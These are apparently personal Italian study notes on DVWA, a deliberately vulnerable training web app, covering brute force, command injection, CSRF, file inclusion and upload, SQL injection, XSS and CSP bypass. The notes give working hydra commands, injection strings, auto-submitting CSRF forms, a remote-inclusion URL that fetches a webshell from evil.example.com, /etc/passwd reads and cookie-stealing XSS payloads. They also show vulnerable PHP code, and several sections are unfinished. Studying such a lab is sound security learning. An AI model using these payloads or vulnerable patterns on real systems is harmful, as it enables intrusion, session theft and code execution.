<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [DVWA](#dvwa)
  - [Brute force](#brute-force)
  - [Command injection](#command-injection)
  - [CSRF](#csrf)
  - [File inclusion](#file-inclusion)
  - [File upload](#file-upload)
  - [Insecure CAPTCHA](#insecure-captcha)
  - [SQL injection](#sql-injection)
  - [SQL injection (blind)](#sql-injection-blind)
  - [Weak session IDs](#weak-session-ids)
  - [XSS (DOM)](#xss-dom)
  - [XSS (Reflected)](#xss-reflected)
  - [XSS (Stored)](#xss-stored)
  - [CSP Bypass](#csp-bypass)
  - [Javascript](#javascript)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# DVWA

- DVWA
	- Host: 172.17.0.2
	- Default credentials: admin/password

- PHP web server
	- Host: 172.17.0.3

## Brute force

### Brute force - Low

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

	`$ hydra -l admin -P rockyou.txt 172.17.0.2 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"`

	parametri http-get-form: `"<RELATIVE PATH>:<PARAMETERS>:<FAILED LOGIN TEXT>:H=Cookie: <REQUEST COOKIES>"`

### Brute force - Medium

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

	`$ hydra -l admin -P rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=medium" -c 3 -t 1`

	dalla man page di hydra:

		```
		-c TIME
			the wait time in seconds per login attempt over all threads (-t 1 is recommended)
			This usually only makes sense if a low task number is used, .e.g -t 1
		-t TASKS
			run TASKS number of connects in parallel (default: 16)
		```

### Brute force - High

È necessario prima fare una GET, recuperare il CSRF token (`user_token`) e fare una seconda GET includendo il valore recuperato.

**curl**

- recupera un PHPSESSID valido (`$1`)

- lancia:

	- recupera il CSRF token

		`
			$ CSRF=$( \
				curl -s --cookie "PHPSESSID=$1; security=high" 'http://172.17.0.2/vulnerabilities/brute/' | \
				awk -F 'value=' '/user_token/ {print $2}' | \
				cut -d "'" -f2)
		`

	- usa il CSRF token per tentare un login

		`$ curl -b dvwa.cookie http://172.17.0.2/vulnerabilities/brute?username=admin&password=password&user_token=${CSRF}&Login=Login`

**BurpSuite**

Configura Burp

- imposta il proxy Burp sul browser
- esegui un tentativo di login

Imposta la Macro

- `Project Options` -> `Sessions` -> `Session Handling Rules` -> `Add`
- `Rule Description`: DVWA Brute High
- `Rule Action` -> `Add` -> `Run a macro`
- `Select macro` -> `Add`
- `Macro Recorder` -> scegli la richiesta tramite cui hai eseguito il tentativo di login -> `OK`
- `Macro description`: Get user_token
- `Configure item`
- `Custom parameters locations in response` -> `Add`
- `Parameter name`: user_token
- `Start after expression`: user_token' value='
- `End at delimiter`: ' />
- `Ok` -> `Ok` -> `Ok`
- abilita `Tolerate URL mismatch when matching parameters (use for URL-agnostic CSRF tokens)`
- `Ok`
- `Scope` -> `Tool Scope -> Only select: Intruder`
- `URL Scope` -> `Use Suite scope [defined in Target tab]`
- `Ok`
- `Target` -> `Site map` -> `<indirizzo IP DVWA>` -> Click destro: `Add to scope`

Prepara l'Intruder

- `Proxy` -> `HTTP History` -> trova la richiesta tramite cui hai eseguito il tentativo di login
- Click destro -> `Send to Intruder`
- `Intruder` -> `2` -> `Positions`
- `Attack type`: `Cluster bomb`
- `Clear §`
- Seleziona il valore dell'username nella query string -> `Add §`
- Seleziona il valore della password nella query string -> `Add §`
- `Intruder` -> `2` -> `Payloads`

- `Payload Sets` -> `Payload Sets`: `1` -> `Payload type`: `Simple list`
- `Payload Options [Simple list]` -> `Add` : `admin` -> `Add`
- `Payload Sets` -> `Payload Sets`: `2` -> `Payload type`: `Simple list`
- `Payload Options [Simple list]` -> `Load ...` : scegli wordlist di password
- `Intruder` -> `2` -> `Options`
- `Attack Results` -> disabilita `Make unmodified baseline request`
- `Grep` - `Extract` -> `Add`
- Start after expression: `<pre><br />`
- End at delimiter: `</pre>`
- `Ok`
- `Intruder` -> `Target` -> `Start attack`

\#FIXME: dopo la prima richiesta, Burp non estrae l'user_token e non lo inserisce nella richiesta successiva

## Command injection

I valori inseriti dall'utente non vengono opportunamente sanitizzati.

### Command injection - Low

- inietta il comando CMD inserendo i seguenti valori:

	- `8.8.8.8; CMD`
	- `8.8.8.8 && CMD`
	- `8.8.8.8 & CMD`
	- `8.8.8.8 | CMD`

### Command injection - Medium

- inietta il comando CMD inserendo i seguenti valori:

	- `8.8.8.8 & CMD`
	- `8.8.8.8 | CMD`

### Command injection - High

\#TODO: continua https://www.exploit-db.com/papers/13073 x43

## CSRF

Cross-Site Request Forgery forza l'utente a fare una richiesta malevola a un sito su cui è autenticato.
L'attacco ha come obiettivo le richieste che cambiano lo stato interno del server, non il furto di dati; infatti l'attaccante non ha modo di vedere la risposta alla richiesta malevola.
Si ha una vulnerabilità "stored CSRF" quando l'attaccante è in grado di rendere persistente l'attacco direttamente sul sito vulnerabile.
A tale scopo si memorizza un tag IMG o IFRAME in un campo che accetta HTML o si realizza un più complesso attacco di XSS.

L'attaccante ha l'obiettivo di far cliccare alla vittima il tag a o ad aprire l'email col tag img. Nell'esempio l'immagine non viene visualizzata in quanto ha altezza e larghezza pari a `0`.

Scenario GET:

- tag a: `<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>`

- tag img: `<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">`

Scenario POST:

Richiesta originale:

```
POST http://bank.com/transfer.do HTTP/1.1

acct=BOB&amount=100
```

Richiesta malevola:

- con interazione della vittima

```
<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
<input type="hidden" name="acct" value="MARIA"/>
<input type="hidden" name="amount" value="100000"/>
<input type="submit" value="View my pictures"/>
</form>
```

- senza interazione della vittima

```
<body onload="document.forms[0].submit()">

<form ...>
```

Scenario API

Richiesta originale:

```
PUT http://bank.com/transfer.do HTTP/1.1

{ "acct":"BOB", "amount":100 }
```

Richiesta malevola:

```
<script>
	function put() {
		var x = new XMLHttpRequest();
		x.open("PUT","http://bank.com/transfer.do",true);
		x.setRequestHeader("Content-Type", "application/json");
		x.send(JSON.stringify({"acct":"BOB", "amount":100}));
	}
</script>

<body onload="put()">
```

Nell'ultimo esempio, la richiesta **non** viene eseguita dai moderni browser grazie alla restrizione *same-origin policy*.
Questa protezione è abilitata di default, a meno che il server abiliti esplicitamente le richieste cross-origin da uno o più siti usando CORS con l'header `Access-Control-Allow-Origin: *`.

### CSRF - Medium

## File inclusion

Questa vulnerabilità si ha quando un'applicazione crea un path per codice eseguibile usando una variabile che è sotto il controllo dell'attaccante,
in un modo che gli permette di controllare quale file viene eseguito.
Sfruttando una vulnerabilità di questo tipo permette una RCE sul server che esegue l'appicazione vulnerabile.

- Remote File Inclusion

	L'applicazione scarica ed esegue un file remoto.

	Exploit:

		http://localhost/vulnerabilities/fi/?page=http://172.17.0.3/rfi.php

- Local File Inclusion

	Come il RFI ma il file sfruttato è presente sul server.

	Exploit:

		http://localhost/vulnerabilities/fi/?page=/etc/passwd

**PHP**

Funzioni che includono un file per l'esecuzione sono `include` e `require`.
La direttiva `allow_url_fopen` o `allow_url_include` (in `php.ini`) abilitata permette di usare una URL per scaricare un file remoto ed eseguirlo.
Anche se disabilitato è raggirabile con compressione (`zlib://`) o stream audio (`ogg://`) che non ispezionano il flag URL PHP interno.
Si possono sfruttare anche i wrapper PHP come `php://input`.

Codice vulnerabile:

```
<form method="get">
   <select name="language">
      <option value="english">English</option>
      <option value="french">French</option>
      ...
   </select>
   <input type="submit">
</form>

<?php
   if ( isset( $_GET['language'] ) ) {
      include( $_GET['language'] . '.php' );
   }
?>
```

Exploit:

```
/vulnerable.php?language=http://evil.example.com/webshell.txt?
/vulnerable.php?language=C:\\ftp\\upload\\exploit
/vulnerable.php?language=C:\\notes.txt%00
/vulnerable.php?language=../../../../../etc/passwd%00
/vulnerable.php?language=../../../../../proc/self/environ%00
```

**JSP**

Anche le JSP sono vulnerabili a Null byte injection (`%00`)

Codice vulnerabile:

```
<%
   String p = request.getParameter("p");
   @include file="<%="includes/" + p +".jsp"%>"
%>
```

Exploit:

```
/vulnerable.jsp?p=../../../../var/log/access.log%00
```

## File upload

L'attaccante carica un file a suo piacimento per poi eseguirlo in altro modo.
L'attaccante può sovrascrivere file già presenti sul server sfruttando path e filename presenti nei metadati HTTP.
Altri problemi si hanno se dimensione o contenuto del file vengono manipolati.

- crea un file fu.php col seguente contenuto

```
<?php
 
phpinfo();

?>
```

- carica il file tramite la funzione

- visita `http://localhost/hackable/uploads/fu.php`

## Insecure CAPTCHA

Il codice fa il controllo sul valore di `$_POST[ 'step' ]`.
Se vale `1` valuta il CAPTCHA, diversamente (`2`) esegue l'operazione di cambio password.

- modifico il valore di `step` a `2` e inserisco la password di mio piacimento (il codice non entra nel ramo if che controlla il CAPTCHA)

## SQL injection

Devo iniettare del codice che verifichi la condizione WHERE.

Codice vulnerabile:

`$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`

Exploit:

`' or 'a' = 'a`

## SQL injection (blind)

L'attaccante si aspetta a seguito della query al database una risposta `true` o `false`.
Osservando le risposte l'attaccante può estrarre informazioni rilevanti.
Se il contenuto dell pagina che ritorna `true` è diverso da quella che ritorna `false`, l'attaccante è in grado di distinguere quando la query eseguita ritorna `true` o `false`.

Codice vulnerabile:

```php
// Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors 
```

Exploit:

`' or '1'='1`

## Weak session IDs

???

## XSS (DOM)

Il payload viene eseguito in modo da modificare sul browser della vittima un elemento DOM, usato originariamente dallo script client-side.

Codice vulnerabile:

`http://www.some.site/page.html?default=French`

```
<select><script>

document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");

document.write("<OPTION value=2>English</OPTION>");

</script></select>
```

Exploit:

```
http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
```

## XSS (Reflected)

Lo script viene attivato attraverso un link, che invia una richiesta a un sito vulnerabile che permette l'esecuzione dello script malevolo.
La vulnerabilità è dovuta all'insufficiente sanitizzazione delle richieste.

Codice Vulnerabile

```
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
```

Exploit

```
http://localhost/vulnerabilities/xss_r/?name=Frodo <script>alert(document.cookie)</script>
```

## XSS (Stored)

Si ha uno Stored XSS quando non viene fatta un'adeguata input validation sulle informazioni inserite dal client.
Il numero di potenziali vittime cresce.

Codice Vulnerabile:

```
// Update database
$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
```

Exploit:

Name*: `Frodo`

Message*: `To Mordor<script>alert('XSS')</script>`

## CSP Bypass

Il response header Content Security Policy (CSP) permette di ridurre i rischi di XSS sui browser moderni, dichiarando quali risorse dinamiche è consentito caricare.

Codice vulnerabile:

```
$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, jquery and google analytics.

...

$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
```

Exploit:

- carica il codice malevolo su https://pastebin.com

- recupera l'URL per il codice RAW

- inserisci l'URL nell'`Include`

## Javascript

La passphrase è `success` ma bisogna inviare il token giusto (quello impostato di default non è calcolato correttamente).

- da console web (`F12` -> `Console`) lancia `md5(rot13("success"))`

- sostituisci il valore ottenuto nel tag `input` nascosto presente nella pagina

---

##### Man pages

curl

	```
	-s, --silent
		Silent or quiet mode. Don't show progress meter or error messages. Makes Curl mute. It will still output the data you ask for, potentially even to the terminal/stdout unless you redirect it.
		Use -S, --show-error in addition to this option to disable progress meter but still show error messages.
		See also -v, --verbose and --stderr.

	-b, --cookie <data|filename>
		(HTTP) Pass the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line. The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".

	-c, --cookie-jar <filename>
		(HTTP) Specify to which file you want curl to write all cookies after a completed operation. Curl writes all cookies from its in-memory cookie storage to the given file at the end of operations. If no cookies are known, no data will be written. The file will be written using the Netscape cookie file format. If you set the file name to a single dash, "-", the cookies will be written to std‐out.
	```

awk

	```
	-F fs
	--field-separator fs
		Use fs for the input field separator (the value of the FS predefined variable). 
	```

cut

	```
	-d, --delimiter=DELIM
		use DELIM instead of TAB for field delimiter

	-f, --fields=LIST
		select only these fields; also print any line that contains
		no delimiter character, unless the -s option is specified
	```

